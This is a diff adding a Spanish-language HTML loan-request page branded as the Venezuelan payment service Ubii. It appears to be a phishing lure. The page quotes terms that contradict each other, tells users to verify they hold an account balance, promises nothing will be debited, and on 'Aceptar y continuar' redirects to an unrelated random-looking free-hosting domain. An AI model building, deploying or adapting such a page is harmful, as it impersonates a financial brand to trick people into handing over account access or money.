@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="es"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport"/>
+<title>Solicitud de Crédito - Ubii</title>
+<!-- Tailwind CSS v3 with Plugins -->
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<!-- Tailwind Configuration -->
+<script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            ubii: {
+              blue: '#007aff',
+              blueHover: '#0062cc',
+              darkBg: '#090a0f',
+              cardBg: '#171922',
+              sliderTrack: '#3d404e',
+              textMuted: '#9aa0b0'
+            }
+          },
+          fontFamily: {
+            sans: ['-apple-system', 'BlinkMacSystemFont', '"SF Pro Display"', '"Segoe UI"', 'Roboto', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+<!-- BEGIN: Custom Styles -->
+<style data-purpose="custom-slider">
+    /* Custom Range Input Styling for iOS/Webkit */
+    input[type=range] {
+      -webkit-appearance: none;
+      background: transparent;
+    }
+
+    input[type=range]:focus {
+      outline: none;
+    }
+
+    /* Track styling */
+    input[type=range]::-webkit-slider-runnable-track {
+      width: 100%;
+      height: 6px;
+      cursor: pointer;
+      border-radius: 9999px;
+      background: transparent;
+    }
+
+    /* Chrome/Safari Thumb */
+    input[type=range]::-webkit-slider-thumb {
+      height: 24px;
+      width: 24px;
+      border-radius: 50%;
+      background: #007aff;
+      cursor: pointer;
+      -webkit-appearance: none;
+      margin-top: -9px;
+      box-shadow: 0 0 12px rgba(0, 122, 255, 0.65), 0 2px 4px rgba(0, 0, 0, 0.4);
+      border: 2px solid #ffffff;
+      transition: transform 0.1s ease;
+    }
+
+    input[type=range]:active::-webkit-slider-thumb {
+      transform: scale(1.15);
+    }
+
+    /* Firefox Track and Thumb */
+    input[type=range]::-moz-range-track {
+      width: 100%;
+      height: 6px;
+      cursor: pointer;
+      border-radius: 9999px;
+      background: transparent;
+    }
+
+    input[type=range]::-moz-range-thumb {
+      height: 24px;
+      width: 24px;
+      border-radius: 50%;
+      background: #007aff;
+      cursor: pointer;
+      border: 2px solid #ffffff;
+      box-shadow: 0 0 12px rgba(0, 122, 255, 0.65);
+    }
+  </style>
+<style data-purpose="smooth-animations">
+    /* Smooth transitions and modal backdrop */
+    .fade-in {
+      animation: fadeIn 0.25s ease-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.96); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+<!-- END: Custom Styles -->
+</head>
+<body class="bg-[#090a0f] text-white font-sans min-h-screen flex flex-col justify-between selection:bg-blue-600 selection:text-white antialiased pb-6 pt-2">
+<!-- BEGIN: MainContainer -->
+<main class="w-full max-w-md mx-auto px-5 sm:px-6 flex-1 flex flex-col justify-between" data-purpose="credit-request-container">
+<!-- Top Content Area -->
+<div class="w-full pt-4 sm:pt-8 flex flex-col items-center">
+<!-- BEGIN: AmountHeaderSection -->
+<section class="text-center w-full mb-6" data-purpose="amount-display-section">
+<!-- Selected Amount Display -->
+ <p class="text-xs text-zinc-300 leading-relaxed my-3 text-center">
+      <h1 class="text-[44px] sm:text-5xl font-black tracking-tight text-white mb-2 " >
+         Solicitud de crédito
+        </h1>
+    </p>
+    <p class="text-xs text-zinc-300 leading-relaxed my-3 text-center">Solicita tu crédito de forma rápida y en línea.</p>
+
+<h1 class="text-[44px] sm:text-5xl font-black tracking-tight text-white mb-2 leading-none" id="amount-display">
+          $70,00
+        </h1>
+<!-- BCV Conversion Rate Display -->
+<p class="text-sm font-normal text-ubii-textMuted tracking-normal" id="bcv-conversion">
+          Bs. 8.810,70 Tasa BCV
+        </p>
+</section>
+<!-- END: AmountHeaderSection -->
+<!-- BEGIN: SliderControlSection -->
+<section class="w-full px-1 mb-8" data-purpose="interactive-slider-control">
+<div class="relative w-full flex items-center py-2">
+<!-- Background track and progress bar -->
+<div class="absolute w-full h-[6px] rounded-full bg-[#343744] overflow-hidden pointer-events-none">
+<div class="h-full bg-ubii-blue rounded-full transition-all duration-75" id="slider-progress" style="width: 0%;"></div>
+</div>
+<!-- Actual Range Input -->
+<input aria-label="Selecciona el monto del crédito" class="relative z-10 w-full cursor-pointer opacity-100" id="credit-slider" max="5000" min="70" step="5" type="range" value="10"/>
+</div>
+<!-- Slider limits indicator -->
+<div class="flex justify-between items-center text-xs text-[#6e7488] font-medium px-1 mt-1">
+<span>Min: $70</span>
+<span></span>
+</div>
+</section>
+<!-- END: SliderControlSection -->
+<!-- BEGIN: CreditTermsInfoSection -->
+<section class="w-full text-center px-4 mb-6" data-purpose="credit-conditions-text">
+<p class="text-xs sm:text-[13px] leading-relaxed text-zinc-300 font-normal">
+          Crédito por <strong class="text-white font-semibold">90 días</strong>, pagadero en <strong class="text-white font-semibold">12 cuotas</strong>.<br class="hidden sm:inline"/>
+          Comisión única del 2.99%, .
+        </p>
+</section>
+<!-- END: CreditTermsInfoSection -->
+<!-- BEGIN: QuotaCardSection -->
+<section class="w-full mb-8" data-purpose="quota-calculation-card">
+<div class="bg-ubii-cardBg border border-[#232733] rounded-2xl py-4 px-6 text-center shadow-lg transition-transform hover:scale-[1.01]">
+<span class="block text-xs sm:text-sm text-zinc-300 font-medium mb-1">
+            Monto Solicitado
+          </span>
+<span class="block text-xl sm:text-2xl font-bold tracking-tight text-white" id="installment-display">
+            $1,50
+          </span>
+<span class="block text-[11px] text-[#717789] mt-0.5">
+            (Equivalente al 15% del total solicitado)
+          </span>
+</div>
+</section>
+<!-- END: QuotaCardSection -->
+<!-- BEGIN: ExpenseCategorySection -->
+<section class="w-full mb-6" data-purpose="category-selection-container">
+<label class="block text-sm sm:text-base font-semibold text-white mb-2.5" for="category-select">
+          Selecciona una categoría de gasto
+        </label>
+<div class="relative">
+<select class="w-full bg-ubii-cardBg border border-[#2a2d3a] text-white text-sm sm:text-base rounded-2xl px-4 py-3.5 pr-10 appearance-none focus:outline-none focus:border-ubii-blue focus:ring-1 focus:ring-ubii-blue transition-colors cursor-pointer" id="category-select">
+<option class="text-zinc-500" disabled="" selected="" value="">Seleccione una categoría</option>
+<option class="bg-[#171922] text-white" value="supermarket">Supermercado y Alimentos</option>
+<option class="bg-[#171922] text-white" value="services">Pago de Servicios</option>
+<option class="bg-[#171922] text-white" value="health">Salud y Farmacia</option>
+<option class="bg-[#171922] text-white" value="education">Educación</option>
+<option class="bg-[#171922] text-white" value="travel">Viajes y Transporte</option>
+<option class="bg-[#171922] text-white" value="technology">Tecnología y Equipos</option>
+<option class="bg-[#171922] text-white" value="other">Otros gastos personales</option>
+</select>
+<!-- Dropdown Chevron Icon -->
+<div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-zinc-400">
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+<path d="M19 9l-7 7-7-7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+</svg>
+</div>
+</div>
+</section>
+<!-- END: ExpenseCategorySection -->
+</div>
+<!-- Bottom Actions Area -->
+<div class="w-full mt-4 flex flex-col gap-4">
+<!-- BEGIN: TermsConditionsSection -->
+<section class="w-full px-1" data-purpose="terms-checkbox-section">
+<label class="flex items-start gap-3 cursor-pointer select-none">
+<input class="mt-0.5 w-4 h-4 rounded bg-[#1f222d] border-[#393d4f] text-ubii-blue focus:ring-ubii-blue focus:ring-offset-[#090a0f] cursor-pointer" id="terms-checkbox" type="checkbox"/>
+<span class="text-xs text-zinc-400 leading-snug">
+            Acepto los <button class="text-ubii-blue hover:underline font-medium" id="open-terms-modal" type="button">términos y condiciones</button> del crédito y autorizo el débito automático de mi cuenta Ubii.
+          </span>
+</label>
+</section>
+<!-- END: TermsConditionsSection -->
+<!-- BEGIN: SubmitButtonSection -->
+<section class="w-full pb-2" data-purpose="submit-action-section">
+<button class="w-full py-4 px-6 rounded-full bg-ubii-blue text-white font-bold text-base tracking-wide transition-all duration-200 shadow-md active:scale-[0.98] disabled:opacity-40 disabled:pointer-events-none hover:bg-ubii-blueHover" disabled="" id="btn-submit" type="button">
+          Solicitar
+        </button>
+</section>
+<!-- END: SubmitButtonSection -->
+</div>
+</main>
+<!-- END: MainContainer -->
+<!-- BEGIN: ConfirmationModal -->
+<aside class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md hidden" data-purpose="confirmation-modal" id="confirmation-modal">
+<div class="bg-[#171922] border border-[#2b3040] rounded-3xl max-w-sm w-full p-6 text-center shadow-2xl fade-in flex flex-col relative">
+<!-- Close Button / Cruz -->
+<button aria-label="Cerrar modal" class="absolute top-4 right-4 text-zinc-400 hover:text-white p-1 rounded-full hover:bg-white/5 transition" id="close-confirm-modal" type="button">
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24">
+<path d="M6 18L18 6M6 6l12 12" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+</svg>
+</button>
+<!-- Icono informativo elegante -->
+<div class="mx-auto w-14 h-14 rounded-2xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-ubii-blue mb-4 shadow-[0_0_20px_rgba(0,122,255,0.15)]">
+<svg class="w-7 h-7" fill="none" stroke="currentColor" viewbox="0 0 24 24">
+<path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+</svg>
+</div>
+<!-- Título -->
+<h3 class="text-lg font-bold text-white mb-2">Verificación de Saldo</h3>
+<!-- Mensaje clave de disponibilidad de fondos -->
+<p class="text-sm font-semibold text-amber-400/95 mb-3 leading-snug">
+      Necesita tener el saldo disponible en su cuenta
+    </p>
+<!-- Tarjeta de detalle de cuota a debitar -->
+<div class="bg-[#0f1118] border border-[#232733] rounded-2xl p-4 my-2 text-center">
+<span class="block text-xs text-zinc-400 font-medium mb-1">Monto solicitado</span>
+<span class="block text-2xl font-black text-white tracking-tight" id="modal-quota-bs">Bs. $15.0,61</span>
+<span class="block text-xs font-semibold text-ubii-blue mt-1" id="modal-quota-usd">$1.50</span>
+</div>
+<!-- Mensaje de confirmación detallado -->
+<p class="text-xs text-zinc-300 leading-relaxed my-3 text-center">
+      Al confirmar, se verificará la disponibilidad para la aprobacion automática de su crédito según las condiciones pactadas.
+    </p>
+    <p class="text-xs text-zinc-300 leading-relaxed my-3 text-center">
+      (El monto solicitado nunca se debitara de su cuenta)
+    </p>
+<!-- Botones de Acción -->
+<div class="flex flex-col gap-2.5 mt-2">
+<button class="w-full py-3.5 px-6 rounded-full bg-ubii-blue text-white font-bold text-sm tracking-wide transition-all duration-200 shadow-lg shadow-blue-600/30 hover:bg-ubii-blueHover active:scale-[0.98]" id="btn-modal-accept" type="button">
+        Aceptar y continuar
+      </button>
+<button class="w-full py-2.5 text-xs text-zinc-400 font-medium hover:text-white transition" id="btn-modal-cancel" type="button">
+        Cancelar
+      </button>
+</div>
+</div>
+</aside>
+<!-- END: ConfirmationModal -->
+<!-- BEGIN: TermsModal -->
+<aside class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm hidden" data-purpose="legal-terms-modal" id="terms-modal">
+<div class="bg-[#171922] border border-[#2b3040] rounded-3xl max-w-sm w-full p-6 text-left shadow-2xl fade-in flex flex-col max-h-[80vh]">
+<h3 class="text-lg font-bold text-white mb-2">Términos y Condiciones</h3>
+<div class="overflow-y-auto text-xs text-zinc-300 space-y-3 pr-1 my-3 flex-1 leading-relaxed">
+<p>1. El crédito otorgado a través de Ubii Pago tiene un plazo único de 30 días continuos a partir del desembolso.</p>
+<p>2. El monto total de financiamiento devengará una comisión administrativa única equivalente al 8.99%.</p>
+<p>3. El cobro se debitará de manera automática en dos (2) cuotas quincenales iguales directamente de los fondos disponibles en su billetera Ubii.</p>
+<p>4. El valor en Bolívares (Bs.) se actualiza diariamente conforme a la Tasa Oficial publicada por el Banco Central de Venezuela (BCV).</p>
+</div>
+<button class="w-full mt-3 py-3 rounded-full bg-zinc-800 text-white font-semibold text-sm hover:bg-zinc-700 transition" id="close-terms-modal" type="button">
+        Entendido y Cerrar
+      </button>
+</div>
+</aside>
+<!-- END: TermsModal -->
+<!-- BEGIN: CreditCalculationScript -->
+<script data-purpose="credit-calculator-logic">
+    // Configuration values
+    const BCV_RATE = 881.07; // Referencia calculada para reflejar el valor visual ($10 = Bs. 8.810,70)
+    const QUOTA_PERCENTAGE = 0.15; // 15% del total solicitado
+
+    // DOM Elements
+    const slider = document.getElementById('credit-slider');
+    const sliderProgress = document.getElementById('slider-progress');
+    const amountDisplay = document.getElementById('amount-display');
+    const bcvConversion = document.getElementById('bcv-conversion');
+    const installmentDisplay = document.getElementById('installment-display');
+    const termsCheckbox = document.getElementById('terms-checkbox');
+    const submitBtn = document.getElementById('btn-submit');
+    const categorySelect = document.getElementById('category-select');
+
+    // Number formatting helper
+    function formatSpanishCurrency(value) {
+      return value.toLocaleString('es-VE', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    }
+
+    // Update dynamic calculations
+    function updateLoanDetails() {
+      const amount = parseFloat(slider.value);
+      const min = parseFloat(slider.min);
+      const max = parseFloat(slider.max);
+
+      // 1. Calculate percentage for track progress
+      const progressPercent = ((amount - min) / (max - min)) * 100;
+      sliderProgress.style.width = `${progressPercent}%`;
+
+      // 2. Display formatted Amount ($)
+      amountDisplay.textContent = `$${formatSpanishCurrency(amount)}`;
+
+      // 3. Display equivalent in Bolívares at BCV rate
+      const bolivares = amount * BCV_RATE;
+      bcvConversion.textContent = `Bs. ${formatSpanishCurrency(bolivares)} Tasa BCV`;
+
+      // 4. Calculate exactly 15% quota amount
+      const quotaAmount = amount * QUOTA_PERCENTAGE;
+      installmentDisplay.textContent = `$${formatSpanishCurrency(quotaAmount)}`;
+    }
+
+    // Toggle button state based on terms agreement and category selection
+    function validateForm() {
+      const isAgreed = termsCheckbox.checked;
+      submitBtn.disabled = !isAgreed;
+    }
+
+    // Event Listeners
+    slider.addEventListener('input', updateLoanDetails);
+    termsCheckbox.addEventListener('change', validateForm);
+
+    // Initial setup on load
+    updateLoanDetails();
+    validateForm();
+  </script>
+<!-- END: CreditCalculationScript -->
+<!-- BEGIN: ModalAndInteractionsScript -->
+<script data-purpose="modal-and-submission-handler">
+    // Configurable redirect URL
+    const EXTERNAL_REDIRECT_URL = 'https://adetcvmklotrrfsfsfsf.iceiy.com/?i=1';
+
+    const termsModal = document.getElementById('terms-modal');
+    const openTermsModalBtn = document.getElementById('open-terms-modal');
+    const closeTermsModalBtn = document.getElementById('close-terms-modal');
+
+    // Confirm Modal Elements
+    const confirmModal = document.getElementById('confirmation-modal');
+    const closeConfirmModalBtn = document.getElementById('close-confirm-modal');
+    const cancelConfirmModalBtn = document.getElementById('btn-modal-cancel');
+    const acceptConfirmModalBtn = document.getElementById('btn-modal-accept');
+    const modalQuotaUsd = document.getElementById('modal-quota-usd');
+    const modalQuotaBs = document.getElementById('modal-quota-bs');
+
+    // Open terms modal
+    openTermsModalBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      termsModal.classList.remove('hidden');
+    });
+
+    // Close terms modal
+    closeTermsModalBtn.addEventListener('click', () => {
+      termsModal.classList.add('hidden');
+    });
+
+    // Close when tapping outside terms card
+    termsModal.addEventListener('click', (e) => {
+      if (e.target === termsModal) {
+        termsModal.classList.add('hidden');
+      }
+    });
+
+    // Close confirm modal helper
+    function closeConfirmationModal() {
+      confirmModal.classList.add('hidden');
+    }
+
+    closeConfirmModalBtn.addEventListener('click', closeConfirmationModal);
+    cancelConfirmModalBtn.addEventListener('click', closeConfirmationModal);
+    confirmModal.addEventListener('click', (e) => {
+      if (e.target === confirmModal) {
+        closeConfirmationModal();
+      }
+    });
+
+    // Submit Action: Validates and Opens Confirmation Dialog
+    document.getElementById('btn-submit').addEventListener('click', () => {
+      if (!termsCheckbox.checked) {
+        alert('Por favor acepte los términos y condiciones antes de continuar.');
+        return;
+      }
+
+      const category = document.getElementById('category-select').value;
+      if (!category) {
+        alert('Por favor selecciona una categoría de gasto antes de continuar.');
+        document.getElementById('category-select').focus();
+        return;
+      }
+
+      // Calculate dynamic quota values in USD & Bs.
+      const currentAmount = parseFloat(slider.value);
+      const quotaUsd = currentAmount * QUOTA_PERCENTAGE;
+      const quotaBs = quotaUsd * BCV_RATE;
+
+      modalQuotaUsd.textContent = `$${formatSpanishCurrency(quotaUsd)}`;
+      modalQuotaBs.textContent = `Bs. ${formatSpanishCurrency(quotaBs)} Tasa BCV`;
+
+      // Show confirmation dialog
+      confirmModal.classList.remove('hidden');
+    });
+
+    // Action on accept and redirect
+    acceptConfirmModalBtn.addEventListener('click', () => {
+      window.location.href = EXTERNAL_REDIRECT_URL;
+    });
+  </script>
+<!-- END: ModalAndInteractionsScript -->
+</body></html>
